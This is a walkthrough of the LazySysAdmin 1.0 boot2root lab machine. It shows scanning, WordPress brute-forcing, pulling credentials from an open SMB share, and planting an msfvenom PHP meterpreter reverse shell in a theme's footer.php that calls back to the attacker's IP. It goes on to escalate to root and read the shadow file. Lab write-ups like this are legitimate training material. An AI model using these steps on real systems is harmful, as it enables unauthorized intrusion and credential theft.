<h1>LazySysAdmin 1.0 Walkthrough</h1>

Author Description: "Boot2root created out of frustration from failing my first OSCP exam attempt."

Difficulty: Beginner - Intermediate


Challenge Accepted...


Start things off with an Nmap scan (of course).

`nmap -Pn -sT -sV -O 192.168.17.139 -p1-65000`

![Image of Nmap](https://blu0.github.io/LSAWalkthrough/LSAnmap.png)

A few different places to start, but I'll take a look at the website first.

![Image of Site](https://blu0.github.io/LSAWalkthrough/LSAsite.png)

Nothing really jumps out after looking around for a bit, so time for some more enumeration.

I'll go with trusty old Nikto here.

`nikto -h 192.168.17.139`
![Image of Nikto](https://blu0.github.io/LSAWalkthrough/LSAnikto.png)

So looking through the results, there are quite a few things to check here.
Robots.txt shows the same directories as the Nikto scan.
The `/old/` and `/test/` directories show nothing.
Poked at `/myphpadmin/` but it requires a password. A few guesses proved useless... meh, moving on for now.
There is a WordPress site, but nothing seems to load. Who cares? I’m going to add `/wp-admin/` anyway and see if there is a login

Voila!

![Image of Wp-admin](https://blu0.github.io/LSAWalkthrough/LSAwp.png)

WordPress looks the most viable way in and would be a quick reverse shell if I can work my way in.
It's time for some WPScan to see what usernames are there.
![Image of WPscan](https://blu0.github.io/LSAWalkthrough/LSAwpscane.png)
![Image of WPscan2](https://blu0.github.io/LSAWalkthrough/LSAwpscanadmin.png)

So we have Admin and nothing else. Ok then.
Trying some WPScan Brute Force, I scraped the site with Cewl
`cewl -m 5 http://192.168.17.139/wordpress -w lazycewl.txt`
Then ran it through some mutations with John The Ripper
`john --wordlist=/root/lazycewl --rules --stdout > lazymutate.txt`
And even tried rockyou for a few minutes before cancelling it
wpscan –u http://192.168.17.139/wordpress –wordlist lazymutate.txt –username admin
Maybe the password is somewhere else...

Time to check the SMB port and see if there is any relevant data to be found.
`enum4linux -a 192.168.17.139`

![Image of Enum4Linux](https://blu0.github.io/LSAWalkthrough/LSAenum4linux.png)

share$ looks interesting
connect as guest

![Image of SMBClient](https://blu0.github.io/LSAWalkthrough/LSAsmbclient.png)

No problem listing

![Image of SMBClient2](https://blu0.github.io/LSAWalkthrough/LSAsmbclient2.png)


Get command works, grabbed the wp-config.php file

![Image of wp-config](https://blu0.github.io/LSAWalkthrough/LSAwp-config.png)



The password works, now time for reverse shell

`msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.17.141 LPORT=4444 -f raw > shell.php`

A little touch up on the format (remove leading // and add ?> to the end), then add to footer.php of theme

![Image of footer](https://blu0.github.io/LSAWalkthrough/LSAfooter.png)


Get meterpreter ready

![Image of meterpreter](https://blu0.github.io/LSAWalkthrough/LSAmeterpreter.png)


Now type run and reload the wordpress site

![Image of meterpreter2](https://blu0.github.io/LSAWalkthrough/LSAmeterpreter2.png)



Shell is successful, getting some system info.
Tried the same password for root, but not working
Moved to /tmp and wget from my attack machine the linuxprivchecker.py script. Ran it, but found nothing obvious. Let’s poke around with what we already have and come back to it.
Maybe there is another user in the database

![Image of mysql](https://blu0.github.io/LSAWalkthrough/LSAmysql.png)

![Image of mysql2](https://blu0.github.io/LSAWalkthrough/LSAmysql2.png)

![Image of mysql3](https://blu0.github.io/LSAWalkthrough/LSAmysql3.png)

Nope, no other users
What other users are on the system?

![Image of passwd](https://blu0.github.io/LSAWalkthrough/LSApasswd.png)


Tried swiching to togie with the same password, no go.
Did I overlook something?
Yes, went back to the SMB share and grabbed deets.txt

![Image of deets](https://blu0.github.io/LSAWalkthrough/LSAdeets.png)

![Image of su](https://blu0.github.io/LSAWalkthrough/LSAsu.png)


Was able to switch to togie with the password, and see the user is in the sudo group

![Image of shadow](https://blu0.github.io/LSAWalkthrough/LSAshadow.png)

![Image of root](https://blu0.github.io/LSAWalkthrough/LSAroot.png)


Proof.txt found, plus I have the root password hash if I want to crack it later
